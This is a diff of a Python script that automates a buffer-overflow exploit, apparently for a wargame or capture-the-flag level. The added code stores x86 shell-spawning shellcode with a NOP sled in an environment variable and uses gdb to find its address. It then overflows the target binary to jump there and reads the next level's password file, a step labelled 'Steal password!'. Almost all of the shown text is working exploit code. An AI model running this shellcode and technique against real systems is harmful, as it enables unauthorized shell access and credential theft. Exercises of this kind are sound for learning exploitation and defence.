@@ -37,17 +37,31 @@ get_func_structure(client, 'main', title='Call function pp (+16)')
 get_func_structure(client, 'pp', title='Call function p (+22)')
 get_func_structure(client, 'p', title='Call function p (+22)')
 
-f = lambda command: f'echo "{command}" | (python -c "print(\'\\x90\' * 3000 + \'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\')"; python -c "print(\'B\' * 14 + \'\\xa4\\xe6\\xff\\xbf\' + \'B\')"; cat) | ./{binary_name} | head -n 3'
+offset = 9
+shellcode = '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e' \
+            '\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'
+
+env_name = 'exploit'
+export_shellcode = f'export {env_name}=$(python -c \'print "\\x90" * 1000 + "{shellcode}"\')'
+env_address = exec(client, f'{export_shellcode} && echo "b *main\nr\nx/200s environ\n" | '
+                           f'gdb ./{binary_name} -q | '
+                           f'grep "{env_name}" | '
+                           f'awk \'{{print $1}}\' | sed \'s/://\'', title=f'Find shell code `{env_name}` address')[0]
+print_output(env_address, f'Env #{env_name} address')
+env_address = exec(client, f'{export_shellcode} && echo "b *main\nr\nx/200xg {env_address}\n" | '
+                           f'gdb ./{binary_name} -q | '
+                           f'head -n 15 | '
+                           f'awk \'{{print $1}}\' | '
+                           f'sed \'s/://\'', title='Search a little deeper...')[7]
+print_output(env_address, f'Env #{env_name} address, finally')
+
+f = lambda command: f"{export_shellcode} && echo \"{command}\" | " \
+                    f"(python -c \"print '.' * 4095 + '\\n' + " \
+                    f"'.' * {offset} + '{address_to_string(env_address)}' + '.' * 50\"; cat) | ./{binary_name}"
 
 current_user = exec(client, f('whoami'), title='Check user')
 print_output(current_user, 'Current user')
-print(current_user)
 
-token = exec(client, f('cat /home/user/bonus1/.pass'))
-print(token)
+token = exec(client, f('cat /home/user/bonus1/.pass'), title='Steal password!')
 
 save_token(token, client)
-
-
-# shell_call_address = find_offset(client, stdin=True, pattern=f"\n01234567890123456789\n{PATTERN}", register='eip')
-
